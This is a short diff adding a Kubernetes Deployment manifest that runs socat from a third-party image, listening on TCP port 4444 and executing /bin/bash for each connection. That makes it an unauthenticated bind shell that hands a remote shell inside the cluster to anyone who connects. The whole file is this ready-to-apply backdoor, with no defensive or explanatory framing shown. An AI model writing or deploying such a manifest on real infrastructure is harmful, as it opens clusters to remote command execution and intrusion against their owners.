@@ -1,0 +1,22 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: socat-deployment
+  labels:
+    app: socat
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: socat
+  template:
+    metadata:
+      labels:
+        app: socat
+    spec:
+      containers:
+      - name: socat
+        image: docker.io/matir/skihut:latest
+        command: ["/usr/bin/socat", "TCP4-LISTEN:4444,nodelay,fork,reuseaddr", "EXEC:/bin/bash"]
+        ports:
+          - containerPort: 4444
